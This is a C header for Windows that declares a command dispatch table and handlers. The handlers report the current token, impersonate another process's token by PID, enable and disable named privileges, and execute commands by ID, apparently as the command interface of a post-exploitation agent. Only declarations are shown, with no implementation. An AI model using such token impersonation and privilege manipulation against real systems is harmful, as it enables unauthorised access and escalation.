#pragma once
#include <Windows.h>

#include "debug.h"
#include "error.h"
#include "generated_commands.h"
#include "security.h"
#include "exports.h"

typedef DWORD (*CommandFunction)(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

typedef struct _COMMAND_MAP
{
	CMD_ID id;
	CommandFunction handler;
} COMMAND_MAP;

extern CONST COMMAND_MAP G_CommandTable[];

/**
 * @brief Returns a summary of the current process token.
 *
 * The current implementation returns a TOKEN_SUMMARY payload containing the
 * user name, user SID, elevation state, and whether the current thread is
 * impersonating.
 *
 * @param dataLen The command argument length in bytes. Unused by this handler.
 * @param data The command argument buffer. Unused by this handler.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdCurrentToken(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Attempts to impersonate the token of a target process.
 *
 * This command reports a numeric success or failure code and the
 * user name of the owner of the impersonated token.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the target PID.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdImpersonateToken(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Attempts to enable a named privilege on the current process token.
 *
 * The request payload is expected to contain a UTF-8 privilege name string.
 * This command reports a numeric success or failure code and whether the
 * privilege was previously enabled.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the privilege name.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdEnablePrivilege(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

DWORD CmdDisablePrivilege(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

DWORD ExecuteCommandById(
	DWORD cmdId,
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);
